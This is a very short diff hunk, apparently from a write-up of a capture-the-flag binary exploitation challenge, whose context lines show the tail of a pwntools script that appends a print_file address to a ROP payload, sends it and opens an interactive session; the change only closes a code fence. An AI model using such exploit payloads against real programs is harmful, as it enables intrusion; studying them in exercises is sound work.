@@ -191,4 +191,4 @@ payload += p64(print_file_plt)
 
 io.sendlineafter(b">", payload)
 io.interactive()
-...
+```
